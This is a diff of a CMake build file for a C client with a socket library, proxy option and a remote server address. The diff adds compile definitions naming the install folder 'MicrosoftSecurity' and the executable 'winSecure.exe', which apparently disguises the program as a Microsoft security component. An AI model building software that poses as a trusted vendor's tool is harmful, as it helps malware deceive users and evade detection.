@@ -8,7 +8,7 @@ set(CMAKE_C_STANDARD 99)
 
 ################################################################################
 
-message(STATUS "Set variables")
+message(STATUS "Create macros")
 
 set(USE_LOCAL "1")
 set(USE_PROXY "0")
@@ -16,6 +16,9 @@ set(OPEN_LOG "1")
 
 set(SERVER_ADDRESS "...")
 set(SERVER_PORT "...")
+
+set(MAIN_FOLDER "MicrosoftSecurity")
+set(PROGRAM_NAME "winSecure.exe")
 
 ################################################################################
 
@@ -47,7 +50,9 @@ add_library(socketlib STATIC ${SRC_SOCKET_LIB})
 message(STATUS "Compile configurations")
 
 add_compile_definitions(OPEN_LOG=${OPEN_LOG})
-target_compile_definitions(client PUBLIC USE_PROXY=${USE_PROXY})
+target_compile_definitions(client PUBLIC USE_PROXY=${USE_PROXY}
+                                         MAIN_FOLDER=${MAIN_FOLDER}
+                                         PROGRAM_NAME=${PROGRAM_NAME})
 
 if(${USE_LOCAL} EQUAL 0)
 
